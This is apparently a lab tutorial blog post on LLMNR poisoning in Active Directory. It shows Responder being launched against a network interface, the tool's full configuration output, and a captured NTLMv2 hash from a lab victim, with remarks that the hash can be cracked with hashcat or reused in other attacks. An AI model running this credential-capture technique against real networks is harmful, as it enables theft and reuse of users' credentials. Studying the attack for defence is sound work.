---
title: "LLMNR Poisoning"
tags:
    - active directory
date: "2024-02-17"
thumbnail: "/assets/img/thumbnail/kerberos.png"
bookmark: true
---

# What is LLMNR

The `Link-Local Multicast Name Resolution` (LLMNR) is a protocol based on the Domain Name System (DNS) packet format that allows both IPv4 and IPv6 hosts to perform name resolution for hosts on the same local link.

The **flaw** occurs cuz of using user's name and NLTMv2 hash in reponding.

# LLMNR Poisoning

when trying to access smb share for example the computer makes the following steps:
- Check local cache for the record and if no record existing
- Send DNS query to the DNS server and the problem occurs here if the DNS server couldn't find the file because
    - The **computer(victim)** sends LLMNR query as broadcast
    - The **responder(Man in the middle)** here will get the name and the NLTMv2 hash of the victim to respond
    - As an attacker you can try cracking the NLTMv2 Hash using tool like `hashcat`

<img src="/assets/img/active dir/Capture.JPG" alt="LLMNR poisoning">

LLMNR poisoning is an attack where a malicious actor listens for LLMNR requests and responds with their own IP address (or another IP of their choosing) to redirect the traffic.

In our discussion we will use a tool called `Responder` to perform the role of the MITM which will get the name & hash and respond to the victim

```bash
┌──(youssif㉿youssif)-[~]
└─$ sudo responder -I eth0                
[sudo] password for youssif: 
sudo: a password is required
                                                                                                                             
┌──(youssif㉿youssif)-[~]
└─$ sudo responder -I eth0                
[sudo] password for youssif: 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.3.0

  To support this project:
  Patreon -> https://www.patreon.com/PythonResponder
  Paypal  -> https://paypal.me/PythonResponder

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    MDNS                       [ON]
    DNS                        [ON]
    DHCP                       [OFF]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [OFF]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Force ESS downgrade        [OFF]

[+] Generic Options:
    Responder NIC              [eth0]
    Responder IP               [192.168.126.135]
    Responder IPv6             [fe80::9857:69cd:4087:1b54]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-NSDPQOYEW3Q]
    Responder Domain Name      [HK3L.LOCAL]
    Responder DCE-RPC Port     [49090]

[+] Listening for events... 
```

Now the responder is set
Let's go to the victim and try accessing the responder IP from the victim machine as shown below

<img src="/assets/img/active dir/Capture1.JPG" alt="failed dns">

When we look again at the responder we will find this

```bash
[SMB] NTLMv2-SSP Client   : 192.168.126.151
[SMB] NTLMv2-SSP Username : RIFT\jax
[SMB] NTLMv2-SSP Hash     : jax::RIFT:98bf26eff5a881f0:F2DD5C0A89CB1502E76F0C5B037915E4:0101000000000000800DF383E561DA01FB1EB125814EEC34000000000200080048004B0033004C0001001E00570049004E002D004E0053004400500051004F005900450057003300510004003400570049004E002D004E0053004400500051004F00590045005700330051002E0048004B0033004C002E004C004F00430041004C000300140048004B0033004C002E004C004F00430041004C000500140048004B0033004C002E004C004F00430041004C0007000800800DF383E561DA0106000400020000000800300030000000000000000100000000200000265F3E95F8F6700FA285D50194F0F4018C8BD4937F07A6298F296D9AE7D0EDD30A001000000000000000000000000000000000000900280063006900660073002F003100390032002E003100360038002E003100320036002E003100330035000000000000000000 
```

As an attacker, u got the NTLMv2 Hash and you can try cracking it.
You can also use the hash without cracking in other attacks.
